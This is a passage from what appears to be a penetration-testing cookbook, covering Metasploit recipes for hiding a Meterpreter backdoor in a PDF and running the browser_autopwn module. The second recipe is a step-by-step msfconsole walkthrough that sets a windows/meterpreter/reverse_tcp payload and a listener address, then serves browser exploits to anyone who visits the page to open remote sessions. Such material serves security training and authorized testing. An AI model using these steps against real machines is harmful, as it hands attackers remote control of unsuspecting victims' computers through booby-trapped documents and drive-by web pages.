    exploit

    ```


    ### How it works...


    In this recipe, we used Metasploit''s `MSFCONSOLE` to exploit and create an Adobe
    PDF file containing a `Meterpreter` backdoor. We began by launching the console
    and searching for all known PDF vulnerabilities. After choosing the `Embedded
    EXE PDF` exploit, which allows us to hide a backdoor program in a legitimate PDF,
    we set our options and executed the exploit. Metasploit will generate a PDF accompanied
    by a `Windows Reverse TCP Payload`. When your target opens the PDF file, `Meterpreter`
    will open acknowledging and activate the session.


    ## Implementing browser_autopwn


    Browser Autopwn is an auxiliary module provided by Metasploit that allows you
    to automate an attack on a victim machine simply when they access a webpage. Browser
    Autopwn performs a fingerprint of the client before it attacks; meaning that it
    will not try a Mozilla Firefox exploit against an Internet Explorer 7 browser.
    Based upon its determination of browser, it decides which exploit is the best
    to deploy.


    ### Getting ready


    A connection to the Internet or internal network is required to complete this
    recipe.


    167

    ![](images/00161.jpeg)


    ### Exploiting Vulnerabilities


    ### How to do it...


    Let''s begin by opening a terminal window:


    1. Open a terminal window.

    2. Launch the `MSFCONSOLE`:


    ```bash

    msfconsole

    ```


    3. Search for the `autopwn` modules:


    ```bash

    Search autopwn

    ```


    4. Use the `browser_autopwn` module:


    ```bash

    Use auxiliary/server/browser_autopwn

    ```


    5. Set our payload. In this case we use Windows Reverse TCP:


    ```bash

    set payload windows/meterpreter/reverse_tcp

    ```


    6. Show the options for this type of payload:


    ```bash

    show options

    ```


    7. Set the host IP address where the reverse connection will be made. In this
    case, the IP address of the PC is `192.168.10.109`:


    ```bash

    set LHOST 192.168.10.109

    ```


    8. Next, we want to set our `URIPATH`. In this case we use `"filetypes"` (with
    quotes):


    ```bash

    set URIPATH "filetypes"

    ```


    9. Finally, we start the exploit:


    ```bash

    exploit

    ```


    10. Metasploit starts the exploit at the IP address `http://[Provided IP Address]:8080`.

    11. When a visitor visits the address, the `browser_autopwn` module tries to connect
    to the user''s machine to set up a remote session. If successful, `Meterpreter`
    will acknowledge the session. To activate the session, use the `session` command:


    ```bash

    session -I 1

    ```


